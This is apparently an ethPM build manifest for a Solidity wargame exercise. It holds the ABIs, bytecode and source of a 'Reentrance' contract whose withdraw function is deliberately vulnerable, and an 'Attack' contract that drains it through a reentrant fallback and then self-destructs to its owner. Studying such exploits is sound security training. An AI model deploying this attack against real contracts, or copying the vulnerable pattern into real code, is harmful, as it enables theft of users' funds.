{"compilers":[{"contractTypes":["Attack"],"name":"solidity","settings":{"optimizer":{"enabled":true,"runs":200},"outputSelection":{"contracts/.cache/openzeppelin/3.2.0/contracts/math/SafeMath.sol":{"":["ast"],"*":["abi","bin-runtime","devdoc","userdoc","evm.bytecode.object","evm.bytecode.sourceMap","evm.deployedBytecode.object"]},"contracts/Attack.sol":{"":["ast"],"*":["abi","bin-runtime","devdoc","userdoc","evm.bytecode.object","evm.bytecode.sourceMap","evm.deployedBytecode.object"]},"contracts/Reentrance.sol":{"":["ast"],"*":["abi","bin-runtime","devdoc","userdoc","evm.bytecode.object","evm.bytecode.sourceMap","evm.deployedBytecode.object"]}},"remappings":["openzeppelin-contracts-06=contracts/.cache/openzeppelin/3.2.0/contracts"]},"version":"0.6.12+commit.27d51765"}],"contractTypes":{"Attack":{"abi":[{"inputs":[{"internalType":"address payable","name":"_target","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"stateMutability":"payable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"amount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"destroy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"donateToTarget","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"}],"contractName":"Attack","deploymentBytecode":{"bytecode":"0x60806040526040516102d23803806102d28339818101604052604081101561002657600080fd5b508051602090910151600180546001600160a01b03199081163317909155600291909155600080546001600160a01b0390931692909116919091179055610260806100726000396000f3fe60806040526004361061004a5760003560e01c806352e3b827146100c257806383197ef0146100ca5780638da5cb5b146100df5780639e5faafc14610110578063aa8c217c14610118575b6000546001600160a01b031631156100c0576000805460025460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100a757600080fd5b505af11580156100bb573d6000803e3d6000fd5b505050505b005b6100c061013f565b3480156100d657600080fd5b506100c06101a2565b3480156100eb57600080fd5b506100f46101b0565b604080516001600160a01b039092168252519081900360200190f35b6100c06101bf565b34801561012457600080fd5b5061012d610224565b60408051918252519081900360200190f35b600080546002546040805162362a9560e01b815230600482015290516001600160a01b039093169362362a959360248084019382900301818588803b15801561018757600080fd5b505af115801561019b573d6000803e3d6000fd5b5050505050565b6001546001600160a01b0316ff5b6001546001600160a01b031681565b6000805460025460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561020a57600080fd5b505af115801561021e573d6000803e3d6000fd5b50505050565b6002548156fea264697066735822122016eb61a4c7977411cb0a2c98d8c8d2d08280a79b1e4bdf6fb09b48c59e2e368864736f6c634300060c0033"},"devdoc":{"kind":"dev","methods":{},"version":1},"methodIdentifiers":{"amount()":"0xaa8c217c","attack()":"0x9e5faafc","destroy()":"0x83197ef0","donateToTarget()":"0x52e3b827","owner()":"0x8da5cb5b"},"runtimeBytecode":{"bytecode":"0x60806040526004361061004a5760003560e01c806352e3b827146100c257806383197ef0146100ca5780638da5cb5b146100df5780639e5faafc14610110578063aa8c217c14610118575b6000546001600160a01b031631156100c0576000805460025460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100a757600080fd5b505af11580156100bb573d6000803e3d6000fd5b505050505b005b6100c061013f565b3480156100d657600080fd5b506100c06101a2565b3480156100eb57600080fd5b506100f46101b0565b604080516001600160a01b039092168252519081900360200190f35b6100c06101bf565b34801561012457600080fd5b5061012d610224565b60408051918252519081900360200190f35b600080546002546040805162362a9560e01b815230600482015290516001600160a01b039093169362362a959360248084019382900301818588803b15801561018757600080fd5b505af115801561019b573d6000803e3d6000fd5b5050505050565b6001546001600160a01b0316ff5b6001546001600160a01b031681565b6000805460025460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561020a57600080fd5b505af115801561021e573d6000803e3d6000fd5b50505050565b6002548156fea264697066735822122016eb61a4c7977411cb0a2c98d8c8d2d08280a79b1e4bdf6fb09b48c59e2e368864736f6c634300060c0033"},"sourceId":"contracts/Attack.sol","sourcemap":"86:669:1:-:0;;;193:168;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;193:168:1;;;;;;;272:5;:18;;-1:-1:-1;;;;;;272:18:1;;;280:10;272:18;;;;300:6;:16;;;;272:5;326:28;;-1:-1:-1;;;;;326:28:1;;;;;;;;;;;;;86:669;;;;;;","userdoc":{"kind":"user","methods":{},"version":1}},"Reentrance":{"abi":[{"inputs":[{"internalType":"address","name":"_who","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"donate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"contractName":"Reentrance","deploymentBytecode":{"bytecode":"0x608060405234801561001057600080fd5b50610296806100206000396000f3fe6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100765780632e1a7d4d146100bb57806370a08231146100e557610049565b3661004957005b600080fd5b6100746004803603602081101561006457600080fd5b50356001600160a01b0316610118565b005b34801561008257600080fd5b506100a96004803603602081101561009957600080fd5b50356001600160a01b0316610157565b60408051918252519081900360200190f35b3480156100c757600080fd5b50610074600480360360208110156100de57600080fd5b5035610169565b3480156100f157600080fd5b506100a96004803603602081101561010857600080fd5b50356001600160a01b03166101e4565b6001600160a01b03811660009081526020819052604090205461013b90346101ff565b6001600160a01b03909116600090815260208190526040902055565b60006020819052908152604090205481565b3360009081526020819052604090205481116101e157604051600090339083908381818185875af1925050503d80600081146101c1576040519150601f19603f3d011682016040523d82523d6000602084013e6101c6565b606091505b50503360009081526020819052604090208054849003905550505b50565b6001600160a01b031660009081526020819052604090205490565b600082820183811015610259576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b939250505056fea264697066735822122076d230ae32fb54278d0bdbdf8cc53baacd41d1010d03d95a3803e010ed291d6764736f6c634300060c0033"},"devdoc":{"kind":"dev","methods":{},"version":1},"methodIdentifiers":{"balanceOf(address)":"0x70a08231","balances(address)":"0x27e235e3","donate(address)":"0x00362a95","withdraw(uint256)":"0x2e1a7d4d"},"runtimeBytecode":{"bytecode":"0x6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100765780632e1a7d4d146100bb57806370a08231146100e557610049565b3661004957005b600080fd5b6100746004803603602081101561006457600080fd5b50356001600160a01b0316610118565b005b34801561008257600080fd5b506100a96004803603602081101561009957600080fd5b50356001600160a01b0316610157565b60408051918252519081900360200190f35b3480156100c757600080fd5b50610074600480360360208110156100de57600080fd5b5035610169565b3480156100f157600080fd5b506100a96004803603602081101561010857600080fd5b50356001600160a01b03166101e4565b6001600160a01b03811660009081526020819052604090205461013b90346101ff565b6001600160a01b03909116600090815260208190526040902055565b60006020819052908152604090205481565b3360009081526020819052604090205481116101e157604051600090339083908381818185875af1925050503d80600081146101c1576040519150601f19603f3d011682016040523d82523d6000602084013e6101c6565b606091505b50503360009081526020819052604090208054849003905550505b50565b6001600160a01b031660009081526020819052604090205490565b600082820183811015610259576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b939250505056fea264697066735822122076d230ae32fb54278d0bdbdf8cc53baacd41d1010d03d95a3803e010ed291d6764736f6c634300060c0033"},"sourceId":"contracts/Reentrance.sol","sourcemap":"113:654:1:-:0;;;;;;;;;;;;;;;;;;;","userdoc":{"kind":"user","methods":{},"version":1}}},"manifest":"ethpm/3","sources":{"contracts/Attack.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"./Reentrance.sol\";\n\ncontract Attack {\n    Reentrance target;\n    address payable public owner;\n    uint256 public amount;\n\n    constructor(address payable _target, uint256 _amount) public payable {\n        owner = msg.sender;\n        amount = _amount;\n        target = Reentrance(_target);\n    }\n\n    function donateToTarget() external payable {\n        target.donate{value: amount}(address(this));\n    }\n\n    function attack() external payable {\n        target.withdraw(amount);\n    }\n\n    fallback() external payable {\n        if (address(target).balance != 0) {\n            target.withdraw(amount);\n        }\n    }\n\n    function destroy() external {\n        selfdestruct(owner);\n    }\n}\n","urls":[]},"contracts/Reentrance.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n    using SafeMath for uint256;\n\n    mapping(address => uint256) public balances;\n\n    function donate(address _to) public payable {\n        balances[_to] = balances[_to].add(msg.value);\n    }\n\n    function balanceOf(address _who) public view returns (uint256 balance) {\n        return balances[_who];\n    }\n\n    function withdraw(uint256 _amount) public {\n        if (balances[msg.sender] >= _amount) {\n            (bool result,) = msg.sender.call{value: _amount}(\"\");\n            if (result) {\n                _amount;\n            }\n            balances[msg.sender] -= _amount;\n        }\n    }\n\n    receive() external payable {}\n}\n","urls":[]}}}